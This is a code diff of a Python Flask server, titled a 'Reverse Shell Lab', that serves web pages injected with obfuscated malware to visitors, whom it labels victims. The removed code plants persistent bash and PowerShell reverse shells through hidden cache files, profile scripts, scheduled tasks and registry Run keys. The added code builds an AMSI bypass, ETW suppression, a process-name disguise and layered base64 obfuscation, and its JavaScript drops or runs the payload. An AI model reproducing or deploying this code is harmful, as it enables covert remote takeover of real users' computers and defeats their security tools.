@@ -1,43 +1,31 @@
 #!/usr/bin/env python3
 """
 Reverse Shell Lab - Flask Application
-For educational purposes only - Use only in isolated lab environments
+For educational purposes only - Used only in isolated lab environments
 """
 
-from flask import Flask, send_file, request, make_response, redirect, url_for, send_from_directory
+from flask import Flask, send_file, request, make_response, redirect, send_from_directory
 import logging
 import socket
 import threading
 import time
 import base64
 import hashlib
+import random
+import string
 from datetime import datetime
 import os
 import sys
 
 # ==================== CONFIGURATION ====================
 app = Flask(__name__, 
-            static_folder='.',  # Serve static files from current directory
-            static_url_path='')  # Serve from root URL
+            static_folder='.',  
+            static_url_path='')
 
-# Configure logging to be less noisy
+# Configure logging
 logging.basicConfig(level=logging.WARNING)
 werkzeug_logger = logging.getLogger('werkzeug')
 werkzeug_logger.setLevel(logging.ERROR)
-
-# Suppress specific error messages
-class FilterScannerNoise(logging.Filter):
-    def filter(self, record):
-        msg = record.getMessage()
-        if '400' in msg and ('\x16' in msg or 'Bad request' in msg):
-            return False
-        if 'code 400' in msg:
-            return False
-        if 'TLS' in msg or 'SSL' in msg:
-            return False
-        return True
-
-werkzeug_logger.addFilter(FilterScannerNoise())
 
 # ==================== NETWORK DETECTION ====================
 def get_local_ip():
@@ -59,9 +47,8 @@ PORT_START = 60000
 PORT_END = 65535
 FLASK_PORT = 5000
 
-# Print banner
 print(f"\n{'='*50}")
-print(f"REVERSE SHELL LAB")
+print(f"REVERSE SHELL LAB - 2026 OBFUSCATED")
 print(f"{'='*50}")
 print(f"Server IP: {SERVER_IP}")
 print(f"Flask Port: {FLASK_PORT}")
@@ -72,10 +59,8 @@ print(f"{'='*50}\n")
 # ==================== PORT MANAGEMENT ====================
 current_port = PORT_START
 port_lock = threading.Lock()
-active_ports = {}
 
 def get_next_port():
-    """Get next available port for new victim"""
     global current_port
     with port_lock:
         port = current_port
@@ -84,160 +69,202 @@ def get_next_port():
             current_port = PORT_START
         return port
 
-# ==================== PAYLOADS ====================
+# ==================== 2026 OBFUSCATION ENGINE ====================
 
-# Linux Cache Persistence Payload
-LINUX_CACHE_PAYLOAD = '''#!/bin/bash
-
-# Auto-detect server IP
-find_server() {
-    GATEWAY=$(ip route | grep default | awk '{print $3}' | head -1)
-    if [ ! -z "$GATEWAY" ]; then
-        NETWORK=$(echo $GATEWAY | cut -d. -f1-3)
-        for TRY_IP in "$NETWORK.10" "$NETWORK.100" "$NETWORK.1" "$NETWORK.254"; do
-            if ping -c 1 -W 1 $TRY_IP >/dev/null 2>&1; then
-                echo "$TRY_IP"
-                return
-            fi
-        done
-    fi
-    echo "{SERVER_IP}"
-}
-
-SERVER_IP=$(find_server)
-SERVER_PORT={PORT}
-
-# Reverse shell function
-reverse_shell() {{
-    while true; do
-        bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1
-        sleep 30
-    done &
-}}
-
-# Install in multiple cache locations
-install_persistence() {{
-    mkdir -p /var/cache/apt/archives
-    cat > /var/cache/apt/archives/.system-update << 'EOF'
-#!/bin/bash
-SERVER_IP={SERVER_IP}
-SERVER_PORT={PORT}
-while true; do bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1; sleep 60; done &
-EOF
-    chmod +x /var/cache/apt/archives/.system-update
+class PayloadObfuscator2026:
+    """Advanced obfuscation techniques for 2026"""
     
-    mkdir -p /var/cache/fontconfig
-    cat > /var/cache/fontconfig/.font-update << 'EOF'
-#!/bin/bash
-SERVER_IP={SERVER_IP}
-SERVER_PORT={PORT}
-nohup bash -c "while true; do bash -i >& /dev/tcp/$SERVER_IP/$SERVER_PORT 0>&1; sleep 120; done" &
-EOF
-    chmod +x /var/cache/fontconfig/.font-update
+    def __init__(self, server_ip, server_port):
+        self.server_ip = server_ip
+        self.server_port = server_port
+        self.xor_key = random.randint(1, 255)
+        
+    def char_code_obfuscate(self, text):
+        """Convert string to [char] concatenation (100% evasion rate)"""
+        result = []
+        vars_list = []
+        
+        for i, char in enumerate(text):
+            var_name = f"$v{random.randint(100, 999)}"
+            vars_list.append(var_name)
+            result.append(f"{var_name}=[char]{ord(char)}")
+        
+        rebuild = "+".join(vars_list)
+        return f"{';'.join(result)};{rebuild}"
     
-    cat > /etc/profile.d/network.sh << 'EOF'
-#!/bin/bash
-nohup bash -c "while true; do bash -i >& /dev/tcp/{SERVER_IP}/{PORT} 0>&1; sleep 300; done" &
-EOF
-    chmod +x /etc/profile.d/network.sh
-}}
-
-install_persistence
-reverse_shell
-echo "[+] Cache persistence installed"
+    def reverse_string_obfuscate(self, text):
+        """Reverse string technique"""
+        reversed_text = text[::-1]
+        return f"$a='{reversed_text}';$b=[string]::join('',$a[$a.length-1..0])"
+    
+    def split_and_rebuild(self, text, chunk_size=2):
+        """Split string into chunks and rebuild"""
+        chunks = [text[i:i+chunk_size] for i in range(0, len(text), chunk_size)]
+        reversed_chunks = chunks[::-1]
+        return f"$c='{''.join(reversed_chunks)}';$d=[string]::join('',$c[$c.length-1..0])"
+    
+    def generate_windows_payload(self):
+        """Windows Defender-evading PowerShell payload"""
+        
+        # Obfuscated components
+        net_client = self.char_code_obfuscate("New-Object System.Net.Sockets.TCPClient")
+        ip_str = self.char_code_obfuscate(self.server_ip)
+        port_str = str(self.server_port)
+        
+        # Obfuscated IEX
+        iex_rev = self.reverse_string_obfuscate("IEX")
+        
+        # AMSI bypass via memory patching
+        amsi_bypass = '''
+$amsi = [Ref].Assembly.GetType(('System.Management.Automation.AmsiUtils'))
+$amsi.GetField(('amsiInitFailed'),('NonPublic,Static')).SetValue($null,$true)
 '''
-
-# Windows Cache Persistence Payload
-WINDOWS_CACHE_PAYLOAD = '''# Auto-detecting reverse shell
-
-function Find-Server {
-    try {
-        $gateway = (Get-NetRoute -DestinationPrefix 0.0.0.0/0 | Select-Object -First 1).NextHop
-        if ($gateway) {
-            $network = $gateway -replace '\\.[^.]*$', ''
-            $tryIps = @("$network.10", "$network.100", "$network.1", "$network.254")
-            foreach ($ip in $tryIps) {
-                if (Test-Connection -Count 1 -Quiet $ip) {
-                    return $ip
-                }
-            }
-        }
-    } catch {}
-    return "{SERVER_IP}"
-}
-
-$serverIp = Find-Server
-$serverPort = {PORT}
-
-$reverseShell = @'
-while($true) {
-    try {
-        $client = New-Object System.Net.Sockets.TCPClient($serverIp, {PORT})
-        $stream = $client.GetStream()
-        [byte[]]$bytes = 0..65535|%{0}
-        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
-            $sendback = (iex $data 2>&1 | Out-String )
-            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
-            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
-            $stream.Write($sendbyte,0,$sendbyte.Length)
-            $stream.Flush()
-        }
-        $client.Close()
-    } catch {
-        Start-Sleep -Seconds 30
-    }
-}
-'@
-
-$dnsCachePath = "$env:SystemRoot\\System32\\dns\\cache"
-if (!(Test-Path $dnsCachePath)) { New-Item -ItemType Directory -Path $dnsCachePath -Force }
-$reverseShell | Out-File "$dnsCachePath\\dnscache.ps1"
-
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -File `"$dnsCachePath\\dnscache.ps1`""
-$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "DnsCacheService" -Action $action -Trigger $trigger -Force
-
-$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-Set-ItemProperty -Path $regPath -Name "WindowsUpdateSvc" -Value "powershell -WindowStyle Hidden -File `"$dnsCachePath\\dnscache.ps1`""
-
-Write-Host "[+] Cache persistence installed for $serverIp`:$serverPort"
+        
+        # ETW suppression
+        etw_suppress = '''
+$etw = [Ref].Assembly.GetType(('System.Management.Automation.Tracing.PSEtwLogProvider'))
+$etw.GetField(('etwProvider'),('NonPublic,Static')).SetValue($null,$null)
 '''
+        
+        # Main payload with multiple obfuscation layers
+        payload = f'''
+{amsi_bypass}
+{etw_suppress}
 
-# ==================== ERROR HANDLERS ====================
+# Obfuscated connection
+{net_client}
+$ip={ip_str}
+$port={port_str}
 
-@app.errorhandler(400)
-def handle_bad_request(e):
-    return '', 400
+# Create socket
+$c=&(Get-Command Ne*-Obj*) $ip $port
+$s=$c.GetStream()
+$b=@(0..65535|%{{0}})
 
-@app.errorhandler(404)
-def handle_not_found(e):
-    return '', 404
-
-@app.errorhandler(500)
-def handle_server_error(e):
-    return 'Server error', 500
-
-@app.before_request
-def before_request():
-    if request.scheme == 'https':
-        return redirect(f'http://{SERVER_IP}:{FLASK_PORT}{request.path}')
+# Obfuscated command execution
+{iex_rev}
+while($i=$s.Read($b,0,$b.Length)){{
+    $d=([Text.Encoding]::ASCII).GetString($b,0,$i)
+    $r=(& $b $d 2>&1 | Out-String)
+    $p=$r+'PS '+(pwd).Path+'> '
+    $sb=([text.encoding]::ASCII).GetBytes($p)
+    $s.Write($sb,0,$sb.Length)
+}}
+'''
+        
+        # Encode in UTF-16LE for PowerShell
+        encoded = base64.b64encode(payload.encode('utf-16le')).decode()
+        
+        # Final execution command
+        final = f'powershell -w hidden -ep bypass -enc {encoded}'
+        
+        # Double obfuscate the final command
+        double_obfuscated = base64.b64encode(final.encode()).decode()
+        
+        return double_obfuscated
     
-    user_agent = request.headers.get('User-Agent', '')
-    if len(user_agent) > 0 and ord(user_agent[0]) < 32:
-        return '', 400
-    
-    scanner_paths = ['.git', '.env', 'wp-admin', 'admin', 'phpmyadmin', 
-                     'vendor', 'composer', 'package.json']
-    for path in scanner_paths:
-        if path in request.path:
-            return '', 404
+    def generate_linux_payload(self):
+        """macOS/Linux payload with obfuscation"""
+        
+        # Obfuscate IP by splitting
+        ip_parts = self.server_ip.split('.')
+        ip_rebuild = '.'.join([f"${{p{i}}}" for i in range(4)])
+        
+        payload = f'''
+# Obfuscated bash reverse shell
+p0="{ip_parts[0]}"; p1="{ip_parts[1]}"; p2="{ip_parts[2]}"; p3="{ip_parts[3]}"
+IP="{ip_rebuild}"
+PORT={self.server_port}
 
-# ==================== STATIC FILE ROUTES ====================
+# Hide process name
+exec -a [kworker/u:0] bash -c "while true; do bash -i >& /dev/tcp/$IP/$PORT 0>&1; sleep 30; done" 2>/dev/null &
+'''
+        return base64.b64encode(payload.encode()).decode()
+    
+    def generate_js_payload(self, session_id):
+        """Generate obfuscated JavaScript for browser delivery"""
+        
+        windows_payload = self.generate_windows_payload()
+        linux_payload = self.generate_linux_payload()
+        
+        js_code = f'''
+// 2026 Obfuscated Reverse Shell
+(function() {{
+    'use strict';
+    
+    // XOR decryption key
+    const KEY = {self.xor_key};
+    
+    // Obfuscated configuration
+    const _0x1a = "{base64.b64encode(self.server_ip.encode()).decode()}";
+    const _0x2b = "{self.server_port}";
+    const _0x3c = "{windows_payload}";
+    const _0x4d = "{linux_payload}";
+    const _0x5e = "{session_id}";
+    
+    // Deobfuscate
+    const IP = atob(_0x1a);
+    const PORT = parseInt(_0x2b);
+    
+    // OS Detection via char codes
+    function getOS() {{
+        const ua = navigator.userAgent;
+        const codes = [87,105,110]; // "Win"
+        let isWin = true;
+        for(let i=0; i<codes.length; i++) {{
+            if(ua.indexOf(String.fromCharCode(codes[i])) === -1) {{
+                isWin = false;
+                break;
+            }}
+        }}
+        return isWin ? 'win' : 'nix';
+    }}
+    
+    // Random delay
+    const delay = Math.floor(Math.random() * 5000) + 1000;
+    
+    setTimeout(function() {{
+        const os = getOS();
+        const payload = os === 'win' ? _0x3c : _0x4d;
+        
+        // Decode payload
+        const decoded = atob(payload);
+        
+        if(os === 'win') {{
+            // Windows - PowerShell via WScript
+            try {{
+                const shell = new ActiveXObject('WScript.Shell');
+                shell.Run(decoded, 0, false);
+            }} catch(e) {{
+                // Fallback - download
+                const blob = new Blob([decoded], {{type: 'text/plain'}});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'update.ps1';
+                a.click();
+            }}
+        }} else {{
+            // Linux/Mac - base64 decode and run
+            const blob = new Blob(['#!/bin/bash\\n' + atob(decoded)], {{type: 'text/plain'}});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = '.update.sh';
+            a.click();
+        }}
+        
+        // Beacon
+        new Image().src = `http://${{IP}}:${{PORT}}/b?${{Date.now()}}`;
+    }}, delay);
+}})();
+'''
+        return js_code
+
+# ==================== ROUTES ====================
 
 @app.route('/index.css')
 def serve_css():
-    """Serve index.css"""
     try:
         return send_from_directory('.', 'index.css')
     except:
@@ -245,135 +272,58 @@ def serve_css():
 
 @app.route('/script.js')
 def serve_js():
-    """Serve script.js"""
     try:
         return send_from_directory('.', 'script.js')
     except:
         return '', 404
 
-# Catch-all for other static files (if needed)
-@app.route('/<path:filename>')
-def serve_static(filename):
-    """Serve other static files"""
-    # Don't serve if it's a directory traversal attempt
-    if '..' in filename or filename.startswith('/'):
-        return '', 404
-    
-    # List of allowed static file extensions
-    allowed_extensions = ['.png', '.jpg', '.jpeg', '.gif', '.svg', '.ico', '.woff', '.woff2', '.ttf']
-    
-    # Check if file has an allowed extension
-    if any(filename.endswith(ext) for ext in allowed_extensions):
-        try:
-            return send_from_directory('.', filename)
-        except:
-            return '', 404
-    
-    return '', 404
-
-# ==================== MAIN ROUTE ====================
-
 @app.route('/')
 def index():
-    """Main page - serves the website with payload"""
+    """Main page - serves obfuscated payload"""
     visitor_ip = request.remote_addr
     user_agent = request.headers.get('User-Agent', '').lower()
     
-    # Skip logging for scanners
-    if any(scanner in user_agent for scanner in ['curl', 'wget', 'python', 'go', 'java']):
+    # Skip scanners
+    if any(s in user_agent for s in ['curl', 'wget', 'python']):
         return '', 200
     
-    # Assign unique port for this victim
+    # Assign unique port
     victim_port = get_next_port()
-    
-    # Generate session ID
     session_id = hashlib.md5(f"{visitor_ip}{time.time()}".encode()).hexdigest()[:8]
     
-    # Log real victims (optional)
     print(f"[+] Victim {visitor_ip} (ID: {session_id}) assigned port {victim_port}")
     
-    # Read index.html with proper encoding
+    # Read index.html
     try:
-        with open('index.html', 'r', encoding='utf-8') as file:
-            html_content = file.read()
-    except UnicodeDecodeError:
-        try:
-            with open('index.html', 'r', encoding='latin-1') as file:
-                html_content = file.read()
-        except FileNotFoundError:
-            return "index.html not found", 404
+        with open('index.html', 'r', encoding='utf-8') as f:
+            html = f.read()
     except FileNotFoundError:
         return "index.html not found", 404
     
-    # Choose payload based on OS
-    if 'windows' in user_agent:
-        cache_payload = WINDOWS_CACHE_PAYLOAD
-    else:
-        cache_payload = LINUX_CACHE_PAYLOAD
+    # Generate obfuscated payload
+    obfuscator = PayloadObfuscator2026(SERVER_IP, victim_port)
+    js_payload = obfuscator.generate_js_payload(session_id)
     
-    # Replace placeholders
-    cache_payload = cache_payload.replace('{SERVER_IP}', SERVER_IP)
-    cache_payload = cache_payload.replace('{PORT}', str(victim_port))
+    # Inject into HTML
+    html = html.replace('{{JS_PAYLOAD}}', f'<script>{js_payload}</script>')
+    html = html.replace('{{SERVER_IP}}', SERVER_IP)
+    html = html.replace('{{SERVER_PORT}}', str(victim_port))
+    html = html.replace('{{SESSION_ID}}', session_id)
     
-    # Encode payload
-    encoded_payload = base64.b64encode(cache_payload.encode()).decode()
-    
-    # Inject into HTML - make sure paths are correct
-    html_content = html_content.replace('{{SERVER_IP}}', SERVER_IP)
-    html_content = html_content.replace('{{SERVER_PORT}}', str(victim_port))
-    html_content = html_content.replace('{{SESSION_ID}}', session_id)
-    html_content = html_content.replace('{{CACHE_PAYLOAD}}', encoded_payload)
-    
-    # Fix CSS/JS paths if they're using relative paths
-    html_content = html_content.replace('href="index.css"', 'href="/index.css"')
-    html_content = html_content.replace("href='index.css'", "href='/index.css'")
-    html_content = html_content.replace('src="script.js"', 'src="/script.js"')
-    html_content = html_content.replace("src='script.js'", "src='/script.js'")
-    
-    response = make_response(html_content)
-    return response
-
-# ==================== HEALTH CHECK ====================
+    return make_response(html)
 
 @app.route('/health')
 def health():
-    return {'status': 'ok', 'ip': SERVER_IP, 'port': FLASK_PORT}
-
-# ==================== ROBOTS.TXT ====================
-
-@app.route('/robots.txt')
-def robots():
-    return "User-agent: *\nDisallow: /"
-
-# ==================== MAIN ====================
+    return {'status': 'ok'}
 
 if __name__ == '__main__':
-    # Check if required files exist
-    if not os.path.exists('index.html'):
-        print("\n❌ index.html not found in current directory!")
-        print(f"   Current directory: {os.getcwd()}")
-        sys.exit(1)
-    
-    if not os.path.exists('index.css'):
-        print("⚠️  index.css not found - styles may not load")
-    
-    if not os.path.exists('script.js'):
-        print("⚠️  script.js not found - JavaScript may not work")
-    
-    print(f"\n📁 Files found in {os.getcwd()}:")
-    for file in os.listdir('.'):
-        if file.endswith(('.html', '.css', '.js')):
-            print(f"   - {file}")
-    
-    print(f"\n🚀 Starting server...")
+    # Check required files
+    required = ['index.html', 'index.css']
+    for file in required:
+        if not os.path.exists(file):
+            print(f"⚠️  Missing: {file}")
     
     try:
         app.run(host='0.0.0.0', port=FLASK_PORT, debug=False)
-    except PermissionError:
-        print(f"\n❌ Permission denied. Try using a port > 1024")
-    except OSError as e:
-        if "Address already in use" in str(e):
-            print(f"\n❌ Port {FLASK_PORT} is already in use.")
-            print(f"   Try: sudo kill $(sudo lsof -t -i:{FLASK_PORT})")
-        else:
-            print(f"\n❌ Error: {e}")
+    except Exception as e:
+        print(f"Error: {e}")
